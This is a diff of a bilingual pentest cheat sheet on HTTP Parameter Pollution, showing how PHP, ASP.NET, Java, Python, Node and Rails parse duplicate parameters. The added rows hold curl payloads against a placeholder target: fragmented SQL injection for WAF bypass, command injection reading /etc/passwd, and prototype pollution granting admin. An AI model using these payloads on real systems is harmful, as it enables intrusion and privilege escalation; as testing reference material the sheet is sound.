@@ -24,19 +24,12 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `$_GET['a']` con `?a=1&a=2` | Returns `'2'` (last) | Standard. |
-| `$_POST['a']` con body `a=1&a=2` | Returns `'2'` | Same. |
-| `$_REQUEST['a']` | Order: EGPCS — last-source-wins | Per-php.ini. |
-| Array access via `[]` | `?a[]=1&a[]=2` returns `['1', '2']` | Explicit array. |
-| Mixed `?a=1&a[]=2` | Mixed types — typically array overrides scalar | Edge. |
-| `parse_str()` | Same as `$_GET` | Function-level. |
-| `array_unique` filter | Some apps dedupe | Per-app. |
-| `extract()` con `EXTR_OVERWRITE` | Last value wins | Function-level. |
-| Sessions con same name | Per-session storage | Edge. |
-| Cookies con same name | Most recently set wins | Cookie behavior. |
-| Older PHP < 5.4 quirks | Param count limits | Legacy. |
-| `max_input_vars` config | DoS-protection limit | Per-config. |
-| Combine con file upload | Multipart form behavior | Edge. |
+| `curl "https://target/?a=1&a=2"` | `$_GET['a']` returns `'2'` (último) | Standard PHP. |
+| `curl -X POST -d "a=1&a=2" https://target/` | `$_POST['a']` returns `'2'` | POST body same. |
+| `curl "https://target/?a[]=1&a[]=2"` | `$_GET['a']` returns `['1','2']` array | Explicit array notation. |
+| `curl "https://target/?a=1&a[]=2"` | Mixed types — array overrides scalar | Type confusion. |
+| `curl -H "Cookie: a=1; a=2" https://target/` | `$_COOKIE['a']` last set wins | Cookie behavior. |
+| `curl "https://target/?a=safe&a=evil"` (last wins) | Backend procesa `evil` | Authentication bypass vector. |
 ^hpp-stack-php
 
 ___
@@ -45,19 +38,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Request.QueryString["a"]` con `?a=1&a=2` | Returns `"1,2"` | Comma-separated. |
-| `Request.Form["a"]` con duplicate | Same | Same. |
-| `Request.Params["a"]` | Same comma-concat | Combined source. |
-| Single value vs array | Default single string with commas | Standard. |
-| `Request.QueryString.GetValues("a")` | Returns `string[]` `["1", "2"]` | Explicit. |
-| Server-side concatenation | `"1,2"` value passed to backend | SQLi WAF bypass vector. |
-| ASP.NET MVC / Web API | Per-binder behavior | Per-version. |
-| Model binding | Multi-value handling configurable | Custom. |
-| `[FromBody]` JSON | Different from query | Multi-source. |
-| `[FromForm]` con duplicates | Standard behavior | Same. |
-| ASP.NET Core | Mostly compatible | Per-version. |
-| Combine con SQLi | `?id=SELECT&id=*&id=FROM&id=users` → `"SELECT,*,FROM,users"` | Standard chain. |
-| WAF bypass canonical | This is the typical bypass vector | High-impact. |
+| `curl "https://target/?a=1&a=2"` | `Request.QueryString["a"]` returns `"1,2"` | ASP.NET default concat. |
+| `curl "https://target/?id=SELECT&id=*&id=FROM&id=users"` | Backend recibe `"SELECT,*,FROM,users"` → SQLi fragmented | WAF bypass canonical. |
+| `curl -X POST -d "a=1&a=2" https://target/` | `Request.Form["a"]` returns `"1,2"` | POST body concat. |
+| Backend code: `Request.QueryString.GetValues("a")` returns `["1","2"]` | Explicit array si dev usa GetValues | Per-callsite differential. |
+| `curl "https://target/api?id=safe&id='%20OR%201=1--"` | Concat `"safe,' OR 1=1--"` → SQLi via fragments | Stack-specific bypass. |
+| `curl "https://target/cmd?c=ls&c=;&c=cat&c=/etc/passwd"` | Command injection fragmented | Same idea. |
 ^hpp-stack-aspnet
 
 ___
@@ -66,62 +52,42 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `request.getParameter("a")` con `?a=1&a=2` | Returns `"1"` (first) | Standard. |
-| `request.getParameterValues("a")` | Returns `String[]` `["1", "2"]` | Explicit array. |
-| Tomcat / Jetty | Same default | Standard. |
-| Spring `@RequestParam("a")` | First value | Default. |
-| Spring `@RequestParam List<String>` | All values | Explicit. |
-| Spring MVC con `String[]` | All values | Explicit. |
-| `request.getParameterMap()` | `Map<String, String[]>` | All values. |
-| Servlet API | Standard behavior | Same. |
-| Combine con XML | If app processes via XML — different behavior | Edge. |
-| WebSphere | Mostly compatible | Same. |
-| WebLogic | Same | Same. |
-| Java EE Filters | May modify | Per-config. |
-| Combine con security frameworks | Spring Security may filter | Per-app. |
+| `curl "https://target/?a=1&a=2"` | `request.getParameter("a")` returns `"1"` (primer) | Standard Java/Tomcat/Jetty. |
+| Backend usa `request.getParameterValues("a")` con same URL | Returns `String[]` `["1","2"]` | Explicit array. |
+| `curl "https://target/admin?user=admin&user=attacker"` | Java toma primer `admin` para auth, backend logic puede usar último | Differential. |
+| `curl "https://target/?a=safe&a=evil"` (Java first-wins) | Backend procesa `safe` | Inverso de PHP. |
+| Spring `@RequestParam("a") String a` returns first | Default Spring | Pre-Spring config. |
+| Spring `@RequestParam("a") List<String> a` returns all | Explicit array binding | Modern Spring. |
+| `curl -X POST -d "a=1&a=2" https://target/` | `request.getParameter` first wins en POST también | Same behavior. |
 ^hpp-stack-java
 
 ___
 
-## Python / Flask / Django (Last Wins típico)
+## Python / Flask / Django
 
-| **Framework** | **Function** | **Behavior** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Flask `request.args.get('a')` | Returns `"1"` (first) — Werkzeug default | First wins typical. |
-| Flask `request.args.getlist('a')` | Returns `["1", "2"]` | Explicit list. |
-| Flask `request.values.get('a')` | Combined query + form, first wins | Multi-source. |
-| Django `request.GET.get('a')` | Returns last `"2"` | Django last-wins. |
-| Django `request.GET.getlist('a')` | Returns `["1", "2"]` | Explicit. |
-| FastAPI con Pydantic | Per-binder | Modern Python. |
-| FastAPI `Query()` typed | Standard | Typed. |
-| Tornado `self.get_argument("a")` | Last value (default) | Tornado-specific. |
-| Tornado `self.get_arguments("a")` | List | Explicit. |
-| AIOHTTP `request.query.get('a')` | First | First wins. |
-| Bottle `request.query.a` | Per-bottle | Per-version. |
-| Pyramid | Standard | Same. |
-| Combine con Pydantic validation | Type checking may vary | Modern. |
+| `curl "https://target/?a=1&a=2"` (Flask) | `request.args.get('a')` returns `'1'` (Werkzeug default — first wins) | Flask. |
+| `curl "https://target/?a=1&a=2"` (Django) | `request.GET.get('a')` returns `'2'` (last wins) | Django. |
+| Backend usa `request.args.getlist('a')` (Flask) o `request.GET.getlist('a')` (Django) | Returns `['1','2']` array | Explicit. |
+| `curl "https://target/api?a=1&a=2"` (FastAPI con Pydantic typed) | Per-binder behavior | Modern Python. |
+| `curl "https://target/?a=1&a=2"` (Tornado `self.get_argument("a")`) | Returns `'2'` (last) | Tornado. |
+| Combine con `request.values` Flask (query + form combined) | First-wins multi-source | Multi-source confusion. |
 ^hpp-stack-python
 
 ___
 
-## Node.js / Express (Varies)
+## Node.js / Express
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `qs` library (Express default) | `?a=1&a=2` → `req.query.a = ['1', '2']` (array) | Default Express. |
-| `querystring` (Node legacy) | Same array behavior | Same. |
-| Express `extended:true` | Uses qs library | Modern. |
-| Express `extended:false` | Uses querystring | Legacy. |
-| Custom config | Per-app | Edge. |
-| `req.query.a[0]` | First element | Manual access. |
-| `req.body.a` con duplicate | Same array behavior | POST body. |
-| body-parser config | Per-config | Standard. |
-| Koa `ctx.query.a` | Per-version | Koa-specific. |
-| Hapi default parser | Per-version | Same. |
-| Fastify `request.query.a` | First wins typically | Standard. |
-| Combine con prototype pollution | `?__proto__[a]=1` con qs library | PP combo. |
-| Multipart `multer` | File upload context | Different. |
-| GraphQL variables | JSON params, distinct from query | Adjacent. |
+| `curl "https://target/?a=1&a=2"` (Express con `qs` default) | `req.query.a = ['1','2']` (array) | Express `extended:true`. |
+| `curl "https://target/?a=1&a=2"` (Express con `querystring` legacy) | Same array behavior | `extended:false`. |
+| Backend `req.query.a[0]` y `req.query.a[1]` | Manual array access | Standard Express. |
+| `curl "https://target/?a=safe&a=evil"` (Express receives array) | Backend logic may use first/last/specific index | Per-app logic. |
+| `curl "https://target/?__proto__[isAdmin]=true&__proto__[role]=admin"` (qs library merge → PP combo) | Prototype Pollution via HPP-style | qs library Object merge. |
+| Koa `ctx.query.a` with `?a=1&a=2` returns array | Per-Koa version | Koa-specific. |
+| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "a=1&a=2" https://target/` | Body parsing same as query (con body-parser) | POST same behavior. |
 ^hpp-stack-node
 
 ___
@@ -130,33 +96,27 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `params[:a]` con `?a=1&a=2` | Returns `"2"` (last) | Standard. |
-| `params[:a].class` | String | Default. |
-| `?a[]=1&a[]=2` | Array `["1", "2"]` | Explicit array notation. |
-| `request.parameters[:a]` | Same as params | Alias. |
-| Rack middleware | Standard parsing | Layer. |
-| Sinatra | Same Rack behavior | Same. |
-| Hash params `?a[b]=1&a[b]=2` | Nested — last wins | Same logic. |
-| Strong parameters | Filtering applied después de parse | Defense at action level. |
-| Combine con CSRF token | Token validated separately | Standard. |
-| Combine con permit() | `params.require(:a).permit(...)` | Whitelist. |
-| Mass assignment | Combine con HPP for privesc | Standard chain. |
-| Action Cable params | Same | Same. |
+| `curl "https://target/?a=1&a=2"` (Rails) | `params[:a]` returns `"2"` (last) | Standard Rails. |
+| `curl "https://target/?a[]=1&a[]=2"` | `params[:a]` returns `["1","2"]` array | Explicit array notation. |
+| `curl "https://target/?a[b]=1&a[b]=2"` | Nested hash — `params[:a][:b]` last wins | Hash params. |
+| `curl "https://target/?a=safe&a=evil"` (Rails last-wins) | Backend procesa `evil` | Same as PHP. |
+| Sinatra con same URL | Rails behavior heredada de Rack | Rack-based same. |
+| Combine con `params.require(:a).permit(...)` | Whitelist applied después de parse | Strong params defense. |
 ^hpp-stack-ruby
 
 ### Cross-stack reference table
 
 ```
-| Stack         | First   | Last    | Concat    | Array notation |
-|---------------|---------|---------|-----------|----------------|
-| PHP           | -       | YES (default) | -    | a[]=1&a[]=2 → array |
-| ASP.NET       | -       | -       | YES "1,2" | GetValues() → array |
-| Java          | YES     | -       | -         | getParameterValues() |
-| Python Flask  | YES     | -       | -         | getlist() → array |
-| Python Django | -       | YES     | -         | getlist() → array |
-| Node Express  | -       | -       | -         | qs default → array |
-| Ruby Rails    | -       | YES     | -         | a[]=1&a[]=2 → array |
-| Go            | YES     | -       | -         | Query()["a"] → array |
+| Stack         | First   | Last         | Concat    | Array notation |
+|---------------|---------|--------------|-----------|----------------|
+| PHP           | -       | YES (default)| -         | a[]=1&a[]=2 → array |
+| ASP.NET       | -       | -            | YES "1,2" | GetValues() → array |
+| Java          | YES     | -            | -         | getParameterValues() |
+| Flask         | YES     | -            | -         | getlist() → array |
+| Django        | -       | YES          | -         | getlist() → array |
+| Express (qs)  | -       | -            | -         | qs default → array |
+| Rails         | -       | YES          | -         | a[]=1&a[]=2 → array |
+| Go            | YES     | -            | -         | Query()["a"] → array |
 ```
 
 ***
